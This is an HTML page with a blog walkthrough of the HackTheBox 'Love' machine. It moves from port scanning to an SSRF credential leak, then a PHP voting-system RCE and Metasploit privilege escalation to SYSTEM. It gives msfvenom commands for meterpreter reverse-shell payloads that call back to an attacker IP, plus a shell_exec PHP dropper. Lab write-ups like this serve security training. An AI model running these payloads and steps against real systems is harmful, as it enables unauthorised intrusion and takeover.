@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Love - HackTheBox machine :: RoundofThree</title>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="Rank: easy  Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).
+2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000." name="description"/>
+<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
+<meta content="noodp" name="robots"/>
+<link href="/labs/love/" rel="canonical"/>
+<link href="/assets/style.css" rel="stylesheet"/>
+<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
+<link href="/favicon.png" rel="shortcut icon"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="" name="twitter:site"/>
+<meta content="RoundofThree" name="twitter:creator"/>
+<meta content="en" property="og:locale"/>
+<meta content="article" property="og:type"/>
+<meta content="Love - HackTheBox machine" property="og:title"/>
+<meta content="Rank: easy  Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).
+2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000." property="og:description"/>
+<meta content="/labs/love/" property="og:url"/>
+<meta content="RoundofThree" property="og:site_name"/>
+<meta content="/favicon.png" property="og:image"/>
+<meta content="2048" property="og:image:width"/>
+<meta content="1024" property="og:image:height"/>
+<meta content="2021-09-07 13:19:35 +0200 +0200" property="article:published_time"/>
+</head>
+<body class="orange">
+<div class="container center headings--one-size">
+<header class="header">
+<div class="header__inner">
+<div class="header__logo">
+<a href="/">
+<div class="logo">
+    RoundofThree
+  </div>
+</a>
+</div>
+<div class="menu-trigger">menu</div>
+</div>
+<nav class="menu">
+<ul class="menu__inner menu__inner--desktop">
+<li><a href="/general">General</a></li>
+<li><a href="/labs">Labs</a></li>
+<li><a href="/research">Research</a></li>
+<li><a href="/">Whoami</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href="/general">General</a></li>
+<li><a href="/labs">Labs</a></li>
+<li><a href="/research">Research</a></li>
+<li><a href="/">Whoami</a></li>
+</ul>
+</nav>
+</header>
+<form action="/search/" id="search" method="get">
+<label for="search-input" hidden="">Search site</label>
+<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
+<input type="submit" value="search"/>
+</form>
+<div class="content">
+<div class="post">
+<h1 class="post-title">
+<a href="/labs/love/">Love - HackTheBox machine</a></h1>
+<div class="post-meta">
+<span class="post-date">
+        2021-09-07 
+      </span>
+<span class="post-author">:: RoundofThree</span>
+</div>
+<span class="post-tags">
+    
+    #<a href="/tags/hackthebox/">HackTheBox</a> 
+    
+  </span>
+<div class="post-content"><div>
+<ul>
+<li>Rank: easy</li>
+</ul>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
+<p>1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).</p>
+<p>2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000. The port 5000 service returns 403 Forbidden, probably due to IP restriction. 443 port responds with 403 Forbidden but the ssl-cert reveals a commonName = staging.love.htb</p>
+<p>3- The pivot points left are the Windows version itself (found Unified Remote 3.9.0.2463, not useful here), Apache 2.4.46 (no exploits found except Optionsbleed, not useful here), web on target and staging.love.htb and samba (I am not experienced enough for now).</p>
+<p>4- Open http://target and <a href="http://staging.love.htb">http://staging.love.htb</a> on browser. Target is a login form for a voting system using PHP, the second one is a webpage to scan urls.</p>
+<p>5- Search for exploits for the software of the voting system in exploitDB. There are two, sqli in the login form and rce when logged in as admin. Also found the source code of the software.</p>
+<p>6- Tried the default admin credentials written in the software docs. No luck. Tried the sqli with Burpsuite, no luck.</p>
+<p>7- Insert http://localhost:5000 in the file url scanner. GOT the admin credentials!</p>
+<p>8- Now having admin account, we can utilise the rce exploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">msfvenom -p php/meterpreter_reverse_shell -f php LHOST<span style="color:#f92672">=</span>10.10.14.44 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> &gt; shell.php <span style="color:#75715e"># Could have used a stealthier name hhhh</span>
+msfconsole use exploit/multi/handler
+</code></pre></div><p>9- Upload in candidates.php and get a shell. Php shells are not stable, cannot even cd to another dir :(. Use meterpreter to upload an EXE.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST and LPORT &gt; update.exe 
+</code></pre></div><p>10- Cannot execute the EXE directly, so let’s upload another PHP with the command shell_exec(‘update.exe’);. See anna.php:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+  <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">'shell.exe'</span>);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></code></pre></div><p>11- Now we get a stable user shell!</p>
+<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
+<p>12- Definitely smth I need is an automatic checker of common privesc misconfigurations, such as WinPEAS. I tried getsystem with no luck. Use metasploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">msfconsole -q
+use exploit/windows/local/always_install_elevated 
+set session <span style="color:#ae81ff">1</span> 
+set LHOST xxxxx
+exploit 
+</code></pre></div><p>13- GOT NT AUTHORITY/SYSTEM shell.</p>
+</div></div>
+</div>
+</div>
+<footer class="footer">
+<div class="footer__inner">
+<div class="copyright copyright--user">
+<span>© 2021 RoundofThree</span>
+</div>
+</div>
+</footer>
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+</div>
+</body>
+</html>
